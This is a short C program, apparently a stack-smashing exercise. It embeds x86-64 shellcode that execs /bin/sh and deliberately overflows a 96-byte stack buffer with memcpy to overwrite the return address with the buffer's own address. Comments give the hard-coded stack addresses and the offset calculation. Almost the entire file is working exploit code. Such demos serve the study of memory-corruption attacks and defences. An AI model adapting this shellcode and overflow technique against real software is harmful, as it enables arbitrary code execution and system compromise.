#include <stdio.h>
#include <string.h>

//actually shell code is of 70 bytes, but rounding it off to 72 bytes.
char shellcode[] =
"\xeb\x27\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x63\x07\x48\x89\x43\x10\x89\xc2"
"\xb0\x3b\x48\x8b\x7b\x08\x48\x8d\x73\x08\x0f\x05\x48\x31\xc9\x48\x89\xcf\xb0"
"\x3c\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";

char large_string[144];

// 0x7fffffffdf70 is address of buffer.
// 0x7fffffffdff8 is address of return address.
// so f8-70 = 88+08 = 90 = 144

void main()
{
	char buffer[96];

	int i;
	long *temp = (long*)large_string;
	for(i=0;i<18;i++)
		*(temp+i) = (long)buffer;

	for(i=0;i<strlen(shellcode);i++)
		large_string[i]=shellcode[i];

	// strcpy(buffer,large_string);
	memcpy(buffer,large_string,144);
}
